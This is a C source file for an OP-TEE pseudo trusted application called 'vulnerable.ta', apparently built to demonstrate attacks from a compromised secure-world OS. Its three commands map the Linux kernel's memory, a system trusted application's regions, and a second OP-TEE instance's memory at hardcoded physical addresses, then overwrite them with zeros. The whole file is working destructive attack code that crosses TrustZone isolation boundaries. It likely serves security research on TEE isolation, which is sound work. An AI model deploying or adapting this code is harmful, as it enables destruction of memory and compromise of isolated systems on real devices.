// SPDX-License-Identifier: BSD-2-Clause
/*
 * Copyright (c) 2015, Linaro Limited
 */
#include <compiler.h>
#include <stddef.h>
#include <stdio.h>
#include <trace.h>
#include <kernel/pseudo_ta.h>
#include <mm/tee_pager.h>
#include <mm/tee_mm.h>
#include <string.h>
#include <string_ext.h>
#include <malloc.h>

#define TA_NAME		"vulnerable.ta"

#define VULNERABLE_UUID \
		{ 0x7f33e9e8, 0x124f, 0x4e04, \
			{ 0x8e, 0x4d, 0x54, 0x4a, 0xd2, 0x87, 0x66, 0xe8 } }

#define VULNERABLE_CMD_LINUX		1
#define VULNERABLE_CMD_SYS_TA		2
#define VULNERABLE_CMD_OTHER_TEE	3

extern struct mmu_partition default_partition ;
paddr_t victim_pa;
unsigned long victim_session_id;
static TEE_Result compromise_linux(uint32_t param_types,
				    TEE_Param params[TEE_NUM_PARAMS])
{
        IMSG("Compromising Linux from compromised OPTEE");
        struct tee_mmap_region mm;
        mm.type = MEM_AREA_NSEC_SHM;
        mm.region_size = 0x2001000;
        mm.pa = 0x91600000;
        mm.va = 0x91600000;
        mm.size = 0x2001000;
        mm.attr = TEE_MATTR_PRW;
        core_mmu_map_region(&default_partition, &mm);

        IMSG("Mapped Linux memory maliciously");
        IMSG("Compromising");
        for(size_t i = 0; i < 0x2001000; i++){
            *((char*)(0x91600000) + i) = 0x0;
        }

        IMSG("Compromised");
        return TEE_SUCCESS;
}

#include <mm/vm.h>
static struct tee_ta_session *tee_ta_find_session_nolock(uint32_t id,
			struct tee_ta_session_head *open_sessions)
{
	struct tee_ta_session *s = NULL;
	struct tee_ta_session *found = NULL;

	TAILQ_FOREACH(s, open_sessions, link) {
		if (s->id == id) {
			found = s;
			break;
		}
	}

	return found;
}
extern struct tee_ta_session_head tee_open_sessions;
static TEE_Result compromise_system_ta(uint32_t param_types,
				    TEE_Param params[TEE_NUM_PARAMS])
{
        struct tee_ta_session *s;
	TEE_Result res;
        IMSG("Compromising system TA from compromised OPTEE");
        s = tee_ta_find_session_nolock(1, &tee_open_sessions);

	struct user_ta_ctx *utc = to_user_ta_ctx(s->ts_sess.ctx);
	struct vm_region *r = NULL;
	ts_push_current_session(&s->ts_sess);

        int counter = 0;
        TAILQ_FOREACH(r, &utc->uctx.vm_info.regions, link){
            counter++;
            if(counter > 6 || counter < 3)
                continue;
            uint32_t prot = TEE_MATTR_PRW | TEE_MATTR_URW;
            res = vm_set_prot(&utc->uctx, r->va,
                    ROUNDUP(r->size, SMALL_PAGE_SIZE), prot);
            if (res){
                IMSG("Failed to change TA permissions");
                return res;
            }
            IMSG("Zeroing 0x%lx sz: 0x%lx", r->va, r->size);
            for(size_t i = 0; i < r->size; i++){
                *((char*)(r->va) + i) = 0x0;
            }
            prot = TEE_MATTR_URX;
            if (IS_ENABLED(CFG_CORE_BTI))
                prot |= TEE_MATTR_GUARDED;
            res = vm_set_prot(&utc->uctx, r->va,
                    ROUNDUP(r->size, SMALL_PAGE_SIZE), prot);
        }
	struct ts_session *ts_sess = ts_pop_current_session();
        (void)ts_sess;

        IMSG("Done!");
	return TEE_SUCCESS;
}

static TEE_Result compromise_second_tee(uint32_t param_types,
				    TEE_Param params[TEE_NUM_PARAMS])
{
	TEE_Result res;
        IMSG("Compromising the other OP-TEE from compromised OP-TEE");
        struct tee_mmap_region mm;
        mm.type = MEM_AREA_NSEC_SHM;
        mm.region_size = 0x0e00000;
#ifdef OPTEE2
        mm.pa = 0xb0000000;
        mm.va = 0xb0000000;
#else
        mm.pa = 0xb2000000;
        mm.va = 0xb2000000;
#endif
        mm.size = 0x0e00000;
        mm.attr = TEE_MATTR_PRW;
        core_mmu_map_region(&default_partition, &mm);

        IMSG("Mapped the other OP-TEE memory maliciously");
        IMSG("Compromising");
        for(size_t i = 0; i < 0x0e00000; i++){
            *((char*)(mm.pa) + i) = 0x0;
        }

	return TEE_SUCCESS;
}

/*
 * Trusted Application Entry Points
 */

static TEE_Result invoke_command(void *psess __unused,
				 uint32_t cmd, uint32_t ptypes,
				 TEE_Param params[TEE_NUM_PARAMS])
{
	switch (cmd) {
	case VULNERABLE_CMD_LINUX:
		return compromise_linux(ptypes, params);
	case VULNERABLE_CMD_SYS_TA:
		return compromise_system_ta(ptypes, params);
	case VULNERABLE_CMD_OTHER_TEE:
		return compromise_second_tee(ptypes, params);
	default:
		break;
	}
	return TEE_ERROR_BAD_PARAMETERS;
}

pseudo_ta_register(.uuid = VULNERABLE_UUID, .name = TA_NAME,
		   .flags = PTA_DEFAULT_FLAGS,
		   .invoke_command_entry_point = invoke_command);
